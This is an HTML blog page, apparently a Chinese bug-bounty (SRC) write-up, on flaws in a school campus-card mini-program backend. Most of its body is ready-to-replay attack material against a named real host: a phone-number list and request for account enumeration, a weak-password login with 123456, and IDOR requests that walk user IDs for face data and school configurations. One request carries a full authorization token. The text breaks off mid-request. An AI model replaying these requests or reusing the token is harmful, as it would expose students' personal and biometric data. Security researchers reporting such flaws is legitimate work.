@@ -1,0 +1,423 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+
+<head>
+    <meta charset="UTF-8">
+<meta name="viewport"
+      content="width=device-width, initial-scale=1.0, maximum-scale=1.0, minimum-scale=1.0">
+<meta http-equiv="X-UA-Compatible" content="ie=edge">
+
+    <meta name="author" content="G00d">
+
+
+    <meta name="subtitle" content="没有人会一直一帆风顺，失败和挫折才是人生常态">
+
+
+
+    <meta name="keywords" content="G00dddd">
+
+
+<title>SRC-挖洞经验积累 | G00d`s Blog</title>
+
+
+
+    <link rel="icon" href="../favicon.ico">
+
+
+
+
+    <!-- stylesheets list from _config.yml -->
+    
+    <link rel="stylesheet" href="../css/style.css">
+    
+
+
+
+    <!-- scripts list from _config.yml -->
+    
+    <script src="../js/script.js"></script>
+    
+    <script src="../js/tocbot.min.js"></script>
+    
+
+
+
+    
+    
+        
+    
+
+
+<meta name="generator" content="Hexo 7.3.0"></head>
+
+<body>
+    <script>
+        // this function is used to check current theme before page loaded.
+        (() => {
+            const currentTheme = window.localStorage && window.localStorage.getItem('theme') || '';
+            const isDark = currentTheme === 'dark';
+            const pagebody = document.getElementsByTagName('body')[0]
+            if (isDark) {
+                pagebody.classList.add('dark-theme');
+                // mobile
+                document.getElementById("mobile-toggle-theme").innerText = "· Dark"
+            } else {
+                pagebody.classList.remove('dark-theme');
+                // mobile
+                document.getElementById("mobile-toggle-theme").innerText = "· Light"
+            }
+        })();
+    </script>
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+<script>
+    //创建雪花元素
+    function snow() {
+      //获取视窗的宽高
+      var width = window.innerWidth;
+      var height = window.innerHeight;
+  
+      var snow = document.createElement("div");             //创建元素
+  
+      //初始化雪花样式
+      size = Math.random() * 15 + 10;                          //随机生成雪花大小
+      snow.style.width = size + "px";
+      snow.style.height = size + "px";
+      snow.style.background = "url(img/雪花" + Math.floor((Math.random()*6)+1) + ".png) no-repeat";   //1-6随机选择雪花的图片
+      // snow.style.background = "url(./雪花.png) no-repeat";
+      snow.style.backgroundSize = '100% 100%';
+      snow.style.position = "fixed";                        //元素的位置相对于浏览器窗口是固定位置，即使窗口是滚动的它也不会移动
+      snow.style.filter = "blur(1px)";                      //给图片设置高斯模糊
+      snow.style.left = Math.random() * width + 'px';         //随机生成雪花的初始位置
+      snow.style.top = "10px";
+      snow.style.opacity = parseInt(Math.random()*10)/2;   //随机生成雪花的透明度
+  
+      //向body添加元素
+      document.body.appendChild(snow);
+  
+      //创建定时器，每30ms雪花下落一次
+      var timer = setInterval(function () {
+        snow.style.top = parseInt(snow.style.top) + 3 + 'px';     //每次下落3px
+  
+        //当雪花到达底部后清除元素
+        if (parseInt(snow.style.top) >= height) {
+          clearInterval(timer);
+          snow.parentNode.removeChild(snow)
+        }
+      }, 30)
+    }
+  
+    //页面加载完成执行函数
+    window.onload = function play() {
+      //创建定时器，每300ms生成一朵雪花
+      setInterval(function () {
+        snow()
+      }, 300)
+    }
+  </script>
+  
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+<script>
+    //蜘蛛网特效
+    !
+    function() {
+        function n(n, e, t) {
+            return n.getAttribute(e) || t
+        }
+        function e(n) {
+            return document.getElementsByTagName(n)
+        }
+        function t() {
+            var t = e("script"),
+            o = t.length,
+            i = t[o - 1];
+            return {
+                l: o,
+                z: n(i, "zIndex", -1),
+                o: n(i, "opacity", .9),   //透明度
+                c: n(i, "color", "255, 102, 153"),   //颜色
+                n: n(i, "count", 99)
+            }
+        }
+        function o() {
+            a = m.width = window.innerWidth || document.documentElement.clientWidth || document.body.clientWidth,
+            c = m.height = window.innerHeight || document.documentElement.clientHeight || document.body.clientHeight
+        }
+        function i() {
+            r.clearRect(0, 0, a, c);
+            var n, e, t, o, m, l;
+            s.forEach(function(i, x) {
+                for (i.x += i.xa, i.y += i.ya, i.xa *= i.x > a || i.x < 0 ? -1 : 1, i.ya *= i.y > c || i.y < 0 ? -1 : 1, r.fillRect(i.x - .5, i.y - .5, 1, 1), e = x + 1; e < u.length; e++) n = u[e],
+                null !== n.x && null !== n.y && (o = i.x - n.x, m = i.y - n.y, l = o * o + m * m, l < n.max && (n === y && l >= n.max / 2 && (i.x -= .03 * o, i.y -= .03 * m), t = (n.max - l) / n.max, r.beginPath(), r.lineWidth = t / 2, r.strokeStyle = "rgba(" + d.c + "," + (t + .2) + ")", r.moveTo(i.x, i.y), r.lineTo(n.x, n.y), r.stroke()))
+            }),
+            x(i)
+        }
+        var a, c, u, m = document.createElement("canvas"),
+        d = t(),
+        l = "c_n" + d.l,
+        r = m.getContext("2d"),
+        x = window.requestAnimationFrame || window.webkitRequestAnimationFrame || window.mozRequestAnimationFrame || window.oRequestAnimationFrame || window.msRequestAnimationFrame ||
+        function(n) {
+            window.setTimeout(n, 1e3 / 45)
+        },
+        w = Math.random,
+        y = {
+            x: null,
+            y: null,
+            max: 2e4
+        };
+        m.id = l,
+        m.style.cssText = "position:fixed;top:0;left:0;z-index:" + d.z + ";opacity:" + d.o,
+        e("body")[0].appendChild(m),
+        o(),
+        window.onresize = o,
+        window.onmousemove = function(n) {
+            n = n || window.event,
+            y.x = n.clientX,
+            y.y = n.clientY
+        },
+        window.onmouseout = function() {
+            y.x = null,
+            y.y = null
+        };
+        for (var s = [], f = 0; d.n > f; f++) {
+            var h = w() * a,
+            g = w() * c,
+            v = 2 * w() - 1,
+            p = 2 * w() - 1;
+            s.push({
+                x: h,
+                y: g,
+                xa: v,
+                ya: p,
+                max: 6e3
+            })
+        }
+        u = s.concat([y]),
+        setTimeout(function() {
+            i()
+        },
+        100)
+    } ();
+
+    //蜘蛛网特效
+    </script>
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+    <div class="wrapper">
+        <header>
+    <nav class="navbar">
+        <div class="container">
+            <div class="navbar-header header-logo"><a href="/">G00d&#39;s Blog</a></div>
+            <div class="menu navbar-right">
+                
+                    <a class="menu-item" href="../archives">Posts</a>
+                
+                    <a class="menu-item" href="../category">Categories</a>
+                
+                    <a class="menu-item" href="../tag">Tags</a>
+                
+                    <a class="menu-item" href="../about">About</a>
+                
+                <input id="switch_default" type="checkbox" class="switch_default">
+                <label for="switch_default" class="toggleBtn"></label>
+            </div>
+        </div>
+    </nav>
+
+    
+    <nav class="navbar-mobile" id="nav-mobile">
+        <div class="container">
+            <div class="navbar-header">
+                <div>
+                    <a href="/">G00d&#39;s Blog</a><a id="mobile-toggle-theme">·&nbsp;Light</a>
+                </div>
+                <div class="menu-toggle" onclick="mobileBtn()">&#9776; Menu</div>
+            </div>
+            <div class="menu" id="mobile-menu">
+                
+                    <a class="menu-item" href="../archives">Posts</a>
+                
+                    <a class="menu-item" href="../category">Categories</a>
+                
+                    <a class="menu-item" href="../tag">Tags</a>
+                
+                    <a class="menu-item" href="../about">About</a>
+                
+            </div>
+        </div>
+    </nav>
+
+</header>
+<script>
+    var mobileBtn = function f() {
+        var toggleMenu = document.getElementsByClassName("menu-toggle")[0];
+        var mobileMenu = document.getElementById("mobile-menu");
+        if(toggleMenu.classList.contains("active")){
+           toggleMenu.classList.remove("active")
+            mobileMenu.classList.remove("active")
+        }else{
+            toggleMenu.classList.add("active")
+            mobileMenu.classList.add("active")
+        }
+    }
+</script>
+            <div class="main">
+                <div class="container">
+    <article class="post-wrap page">
+        
+        <h2 class="post-title">SRC-挖洞经验积累</h2>
+        
+        <section class="post-content">
+            <h1 id="溧阳市光华高级中学小程序校园卡充值漏洞"><a href="#溧阳市光华高级中学小程序校园卡充值漏洞" class="headerlink" title="溧阳市光华高级中学小程序校园卡充值漏洞"></a>溧阳市光华高级中学小程序校园卡充值漏洞</h1><p>​	<img src="/%E6%9C%AA%E5%85%AC%E5%BC%80/SRC-%E6%8C%96%E6%B4%9E%E7%BB%8F%E9%AA%8C%E7%A7%AF%E7%B4%AF.html/1.png" alt="1"></p>
+<figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">1、手机号枚举</span><br></pre></td></tr></table></figure>
+
+<p><img src="/%E6%9C%AA%E5%85%AC%E5%BC%80/SRC-%E6%8C%96%E6%B4%9E%E7%BB%8F%E9%AA%8C%E7%A7%AF%E7%B4%AF.html/image-20241213192218134.png" alt="image-20241213192218134"></p>
+<p><img src="/%E6%9C%AA%E5%85%AC%E5%BC%80/SRC-%E6%8C%96%E6%B4%9E%E7%BB%8F%E9%AA%8C%E7%A7%AF%E7%B4%AF.html/image-20241213192231954.png" alt="image-20241213192231954"></p>
+<figure class="highlight dns"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">13000000000</span></span><br><span class="line"><span class="number">13200000000</span></span><br><span class="line"><span class="number">13300000000</span></span><br><span class="line"><span class="number">13500000000</span></span><br><span class="line"><span class="number">13800000000</span></span><br><span class="line"><span class="number">15000000000</span></span><br><span class="line"><span class="number">15300000000</span></span><br><span class="line"><span class="number">15500000000</span></span><br><span class="line"><span class="number">15800000000</span></span><br><span class="line"><span class="number">18000000000</span></span><br><span class="line"><span class="number">18100000000</span></span><br><span class="line"><span class="number">13011111111</span></span><br><span class="line"><span class="number">13111111111</span></span><br><span class="line"><span class="number">13122222222</span></span><br><span class="line"><span class="number">13211111111</span></span><br><span class="line"><span class="number">13233333333</span></span><br><span class="line"><span class="number">13244444444</span></span><br><span class="line"><span class="number">13255555555</span></span><br><span class="line"><span class="number">13266666666</span></span><br><span class="line"><span class="number">13299999999</span></span><br><span class="line"><span class="number">13311111111</span></span><br><span class="line"><span class="number">13322222222</span></span><br><span class="line"><span class="number">13355555555</span></span><br><span class="line"><span class="number">13366666666</span></span><br><span class="line"><span class="number">13377777777</span></span><br><span class="line"><span class="number">13399999999</span></span><br><span class="line"><span class="number">13511111111</span></span><br><span class="line"><span class="number">13555555555</span></span><br><span class="line"><span class="number">13566666666</span></span><br><span class="line"><span class="number">13599999999</span></span><br><span class="line"><span class="number">13411111111</span></span><br><span class="line"><span class="number">13455555555</span></span><br><span class="line"><span class="number">13611111111</span></span><br><span class="line"><span class="number">13666666666</span></span><br><span class="line"><span class="number">13777777777</span></span><br><span class="line"><span class="number">13788888888</span></span><br><span class="line"><span class="number">13822222222</span></span><br><span class="line"><span class="number">13877777777</span></span><br><span class="line"><span class="number">13899999999</span></span><br><span class="line"><span class="number">13900000000</span></span><br><span class="line"><span class="number">13911111111</span></span><br><span class="line"><span class="number">13922222222</span></span><br><span class="line"><span class="number">13933333333</span></span><br><span class="line"><span class="number">13955555555</span></span><br><span class="line"><span class="number">13999999999</span></span><br><span class="line"><span class="number">15211111111</span></span><br><span class="line"><span class="number">15222222222</span></span><br><span class="line"><span class="number">15244444444</span></span><br><span class="line"><span class="number">15255555555</span></span><br><span class="line"><span class="number">15311111111</span></span><br><span class="line"><span class="number">15333333333</span></span><br><span class="line"><span class="number">15388888888</span></span><br><span class="line"><span class="number">15555555555</span></span><br><span class="line"><span class="number">15566666666</span></span><br><span class="line"><span class="number">15577777777</span></span><br><span class="line"><span class="number">15588888888</span></span><br><span class="line"><span class="number">15600000000</span></span><br><span class="line"><span class="number">15611111111</span></span><br><span class="line"><span class="number">15622222222</span></span><br><span class="line"><span class="number">15633333333</span></span><br><span class="line"><span class="number">15644444444</span></span><br><span class="line"><span class="number">15677777777</span></span><br><span class="line"><span class="number">15688888888</span></span><br><span class="line"><span class="number">15699999999</span></span><br><span class="line"><span class="number">15711111111</span></span><br><span class="line"><span class="number">15733333333</span></span><br><span class="line"><span class="number">15788888888</span></span><br><span class="line"><span class="number">15811111111</span></span><br><span class="line"><span class="number">15866666666</span></span><br><span class="line"><span class="number">15888888888</span></span><br><span class="line"><span class="number">15899999999</span></span><br><span class="line"><span class="number">15911111111</span></span><br><span class="line"><span class="number">15922222222</span></span><br><span class="line"><span class="number">15933333333</span></span><br><span class="line"><span class="number">18011111111</span></span><br><span class="line"><span class="number">18122222222</span></span><br><span class="line"><span class="number">18222222222</span></span><br><span class="line"><span class="number">18388888888</span></span><br><span class="line"><span class="number">18444444444</span></span><br><span class="line"><span class="number">18500000000</span></span><br><span class="line"><span class="number">18511111111</span></span><br><span class="line"><span class="number">18611111111</span></span><br><span class="line"><span class="number">18666666666</span></span><br><span class="line"><span class="number">18711111111</span></span><br><span class="line"><span class="number">18800000000</span></span><br><span class="line"><span class="number">18811111111</span></span><br><span class="line"><span class="number">18822222222</span></span><br><span class="line"><span class="number">18899999999</span></span><br><span class="line"><span class="number">18900000000</span></span><br><span class="line"><span class="number">18911111111</span></span><br><span class="line"><span class="number">18966666666</span></span><br><span class="line"><span class="number">18988888888</span></span><br><span class="line"><span class="number">18999999999</span></span><br><span class="line"><span class="number">13100000001</span></span><br><span class="line"><span class="number">13000000001</span></span><br><span class="line"><span class="number">13200000001</span></span><br><span class="line"><span class="number">13300000001</span></span><br><span class="line"><span class="number">13500000001</span></span><br><span class="line"><span class="number">15100000001</span></span><br><span class="line"><span class="number">15200000001</span></span><br><span class="line"><span class="number">15300000001</span></span><br><span class="line"><span class="number">18000000001</span></span><br><span class="line"><span class="number">18300000001</span></span><br><span class="line"><span class="number">18800000001</span></span><br><span class="line"><span class="number">18812345678</span></span><br></pre></td></tr></table></figure>
+
+<figure class="highlight makefile"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">请求包：</span><br><span class="line">POST /app/bepf/user/check_tel_useful?user_tel=13000000000 HTTP/1.1</span><br><span class="line"><span class="section">Host: wxk12.weds.com.cn</span></span><br><span class="line"><span class="section">Content-Length: 2</span></span><br><span class="line"><span class="section">Accept: application/json, text/plain, */*</span></span><br><span class="line"><span class="section">Xweb_xhr: 1</span></span><br><span class="line"><span class="section">User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.0.0 Safari/537.36 MicroMessenger/7.0.20.1781(0x6700143B) NetType/WIFI MiniProgramEnv/Windows WindowsWechat/WMPF WindowsWechat(0x63090c11)XWEB/11275</span></span><br><span class="line"><span class="section">Content-Type: application/x-www-form-urlencoded</span></span><br><span class="line"><span class="section">Sec-Fetch-Site: cross-site</span></span><br><span class="line"><span class="section">Sec-Fetch-Mode: cors</span></span><br><span class="line"><span class="section">Sec-Fetch-Dest: empty</span></span><br><span class="line"><span class="section">Referer: https://servicewechat.com/wx4294667ee315a00a/312/page-frame.html</span></span><br><span class="line"><span class="section">Accept-Encoding: gzip, deflate, br</span></span><br><span class="line"><span class="section">Accept-Language: zh-CN,zh;q=0.9</span></span><br><span class="line"><span class="section">Connection: keep-alive</span></span><br><span class="line"></span><br><span class="line">&#123;&#125;</span><br></pre></td></tr></table></figure>
+
+<p><img src="/%E6%9C%AA%E5%85%AC%E5%BC%80/SRC-%E6%8C%96%E6%B4%9E%E7%BB%8F%E9%AA%8C%E7%A7%AF%E7%B4%AF.html/4.png" alt="4"></p>
+<figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">存在</span><br></pre></td></tr></table></figure>
+
+<p><img src="/%E6%9C%AA%E5%85%AC%E5%BC%80/SRC-%E6%8C%96%E6%B4%9E%E7%BB%8F%E9%AA%8C%E7%A7%AF%E7%B4%AF.html/5.png" alt="5"></p>
+<figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">不存在</span><br></pre></td></tr></table></figure>
+
+<p><img src="/%E6%9C%AA%E5%85%AC%E5%BC%80/SRC-%E6%8C%96%E6%B4%9E%E7%BB%8F%E9%AA%8C%E7%A7%AF%E7%B4%AF.html/6.png" alt="6"></p>
+<figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="attribute">2</span>、弱口令,密码为<span class="number">123456</span></span><br></pre></td></tr></table></figure>
+
+<figure class="highlight dns"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">15000000000</span></span><br><span class="line"><span class="number">13911111111</span></span><br><span class="line"><span class="number">15600000000</span></span><br><span class="line"><span class="number">15622222222</span></span><br><span class="line"><span class="number">15933333333</span></span><br><span class="line"><span class="number">18822222222</span></span><br><span class="line"><span class="number">13377777777</span></span><br><span class="line"><span class="number">18800000001</span></span><br><span class="line"><span class="number">18000000000</span></span><br><span class="line"><span class="number">15922222222</span></span><br><span class="line"><span class="number">18122222222</span></span><br><span class="line"><span class="number">13933333333</span></span><br><span class="line"><span class="number">13111111111</span></span><br><span class="line"><span class="number">13355555555</span></span><br><span class="line"><span class="number">15733333333</span></span><br><span class="line"><span class="number">15588888888</span></span><br><span class="line"><span class="number">13500000000</span></span><br><span class="line"><span class="number">13788888888</span></span><br><span class="line"><span class="number">15800000000</span></span><br><span class="line"><span class="number">18988888888</span></span><br><span class="line"><span class="number">13233333333</span></span><br><span class="line"><span class="number">15633333333</span></span><br><span class="line"><span class="number">15699999999</span></span><br><span class="line"><span class="number">15555555555</span></span><br><span class="line"><span class="number">13255555555</span></span><br><span class="line"><span class="number">15866666666</span></span><br><span class="line"><span class="number">18300000001</span></span><br><span class="line"><span class="number">15899999999</span></span><br><span class="line"><span class="number">13511111111</span></span><br><span class="line"><span class="number">13899999999</span></span><br><span class="line"><span class="number">13366666666</span></span><br><span class="line"><span class="number">18900000000</span></span><br><span class="line"><span class="number">13955555555</span></span><br><span class="line"><span class="number">18222222222</span></span><br><span class="line"><span class="number">15388888888</span></span><br></pre></td></tr></table></figure>
+
+<p><img src="/%E6%9C%AA%E5%85%AC%E5%BC%80/SRC-%E6%8C%96%E6%B4%9E%E7%BB%8F%E9%AA%8C%E7%A7%AF%E7%B4%AF.html/7.png" alt="7"></p>
+<figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">Paylaod：</span><br><span class="line">POST <span class="regexp">/api/</span>v2<span class="regexp">/auth/</span>wechat_login<span class="regexp">/form_login HTTP/</span><span class="number">1.1</span></span><br><span class="line">Host: wxk12.weds.com.cn</span><br><span class="line">Content-Length: <span class="number">140</span></span><br><span class="line">Accept: application<span class="regexp">/json, text/</span>plain, */*</span><br><span class="line">Xweb_xhr: <span class="number">1</span></span><br><span class="line">User-Agent: Mozilla<span class="regexp">/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/</span><span class="number">537.36</span> (KHTML, like Gecko) Chrome<span class="regexp">/122.0.0.0 Safari/</span><span class="number">537.36</span> MicroMessenger<span class="regexp">/7.0.20.1781(0x6700143B) NetType/</span>WIFI MiniProgramEnv<span class="regexp">/Windows WindowsWechat/</span>WMPF WindowsWechat(<span class="number">0</span>x63090c11)XWEB/<span class="number">11275</span></span><br><span class="line">Content-Type: application/json;charset=UTF-<span class="number">8</span></span><br><span class="line">Sec-Fetch-Site: cross-site</span><br><span class="line">Sec-Fetch-Mode: cors</span><br><span class="line">Sec-Fetch-Dest: empty</span><br><span class="line">Referer: https:<span class="regexp">//</span>servicewechat.com<span class="regexp">/wx4294667ee315a00a/</span><span class="number">312</span>/page-frame.html</span><br><span class="line">Accept-Encoding: gzip, deflate, br</span><br><span class="line">Accept-Language: zh-CN,zh;q=<span class="number">0.9</span></span><br><span class="line">Connection: keep-alive</span><br><span class="line"></span><br><span class="line">&#123;<span class="string">&quot;username&quot;</span>:<span class="string">&quot;15388888888&quot;</span>,<span class="string">&quot;password&quot;</span>:<span class="string">&quot;Sih+9QUK+0N1XtnAY+lUtQ==&quot;</span>,<span class="string">&quot;openid&quot;</span>:<span class="string">&quot;6P3uvK0XOXx0cKDJNx3qlUnN8fSVOqlvQWdRb9RoKlnbANvOJRJdXKnusCipaUZ8&quot;</span>&#125;</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">响应：</span><br></pre></td></tr></table></figure>
+
+<p><img src="/%E6%9C%AA%E5%85%AC%E5%BC%80/SRC-%E6%8C%96%E6%B4%9E%E7%BB%8F%E9%AA%8C%E7%A7%AF%E7%B4%AF.html/8.png" alt="8"></p>
+<figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="attribute">3</span>、越权<span class="number">1</span></span><br></pre></td></tr></table></figure>
+
+<figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">遍历ID <span class="number">19</span>w+个</span><br><span class="line">https:<span class="regexp">//</span>wxk12.weds.com.cn<span class="regexp">/api/</span>v2<span class="regexp">/face/</span>detail?user_id=<span class="number">190124</span></span><br></pre></td></tr></table></figure>
+
+<p><img src="/%E6%9C%AA%E5%85%AC%E5%BC%80/SRC-%E6%8C%96%E6%B4%9E%E7%BB%8F%E9%AA%8C%E7%A7%AF%E7%B4%AF.html/9.png" alt="9"></p>
+<figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="attribute">GET</span> /api/v2/face/detail?user_id=<span class="number">197021</span> HTTP/<span class="number">1</span>.<span class="number">1</span></span><br><span class="line"><span class="attribute">Host</span>: wxk12.weds.com.cn</span><br><span class="line"><span class="attribute">Accept</span>: application/json, text/plain, */*</span><br><span class="line"><span class="attribute">Xweb_xhr</span>: <span class="number">1</span></span><br><span class="line"><span class="attribute">Authorization</span>: Token ZXlKcmFXUWlPaUl3SWl3aWRIbHdJam9pU2xkVUlpd2lZV3huSWpvaVNGTXlOVFlpZlEuZXlKcFlYUWlPakUzTXpNNE9UVTROekFzSW5OMVlpSTZJbXh2WjJsdUlpd2lhWE56SWpvaWQyVmtjeUlzSW1WNGNDSTZNVGN6TkRVd01EWTNNQ3dpY0dGc1p5STZJbUZsY3kweU5UWXRZMkpqSWl3aWNHdGxlV2xrSWpvaU1TSXNJbXAwYVNJNklqRTVOekF5TVdGd2NDMWhjR2xzYjJkcGJpSXNJbUYxWkNJNkltRndjQzFoY0draUxDSndaR0YwWVNJNklqVTRaakkyTUdVek1XVTJNamxrTVdSak1USTJObU15TnpRM1pXRXpNV0UyT0dVMlkyTm1ZelJtWm1OaE1HRTFOamswT0dJeE16ZGpaRFZqTW1JeVpXWTNPVFV6WkRGa01EaGxaVEl6TlRneFltSXdNMlprWmpSa01qaGtaREJtTVRNM056azBObVl4T1RBelpUQmpOV0l6TlRJMU1USTNOV1l6TmpFNE9EWmpaREl6TUdZellXVmlNakJrTVdNNFpHSXlOVFV6TWpJek1UQTFPVEU1TmpNd1ptUm1OVGRpTVRVNU1EY3pNamN6WkRFek9ETmlPRE01TXpFMU1tSTJabVZsT1dFNVpURTBabU0zTW1JelpHUmpNR1ppWXpjd1pqUmlZMll5WVRNM09ESTVOamd4WldSaE5qYzRNRE0wWldZM05qQmxOalE0TW1Zd01USXdaVEFpZlEuSXhBdmZqX0RFci0tMjdFci1IeEJsckpsOWlPRm1lRjhpeFNoUWFkQVN6WQ==</span><br><span class="line"><span class="attribute">User</span>-Agent: Mozilla/<span class="number">5</span>.<span class="number">0</span> (Windows NT <span class="number">10</span>.<span class="number">0</span>; Win64; x64) AppleWebKit/<span class="number">537</span>.<span class="number">36</span> (KHTML, like Gecko) Chrome/<span class="number">122.0.0.0</span> Safari/<span class="number">537</span>.<span class="number">36</span> MicroMessenger/<span class="number">7.0.20.178</span>1(<span class="number">0</span>x6700143B) NetType/WIFI MiniProgramEnv/Windows WindowsWechat/WMPF WindowsWechat(<span class="number">0</span>x63090c11)XWEB/<span class="number">11275</span></span><br><span class="line"><span class="attribute">Content</span>-Type: application/json</span><br><span class="line"><span class="attribute">Sec</span>-Fetch-Site: cross-site</span><br><span class="line"><span class="attribute">Sec</span>-Fetch-Mode: cors</span><br><span class="line"><span class="attribute">Sec</span>-Fetch-Dest: empty</span><br><span class="line"><span class="attribute">Referer</span>: https://servicewechat.com/wx4294667ee315a00a/<span class="number">312</span>/page-frame.html</span><br><span class="line"><span class="attribute">Accept</span>-Encoding: gzip, deflate, br</span><br><span class="line"><span class="attribute">Accept</span>-Language: zh-CN,zh;q=<span class="number">0</span>.<span class="number">9</span></span><br><span class="line"><span class="attribute">Connection</span>: keep-alive</span><br></pre></td></tr></table></figure>
+
+<p><img src="/%E6%9C%AA%E5%85%AC%E5%BC%80/SRC-%E6%8C%96%E6%B4%9E%E7%BB%8F%E9%AA%8C%E7%A7%AF%E7%B4%AF.html/10.png" alt="10"></p>
+<figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="attribute">4</span>、越权<span class="number">2</span></span><br></pre></td></tr></table></figure>
+
+<figure class="highlight makefile"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">遍历学校信息1000+个</span><br><span class="line"><span class="section">https://wxk12.weds.com.cn/api/v2/school/101014/config</span></span><br><span class="line"></span><br><span class="line">遍历ID：101014</span><br><span class="line"></span><br><span class="line">GET /api/v2/school/101014/config HTTP/1.1</span><br><span class="line"><span class="section">Host: wxk12.weds.com.cn</span></span><br><span class="line"><span class="section">Accept: application/json, text/plain, */*</span></span><br><span class="line"><span 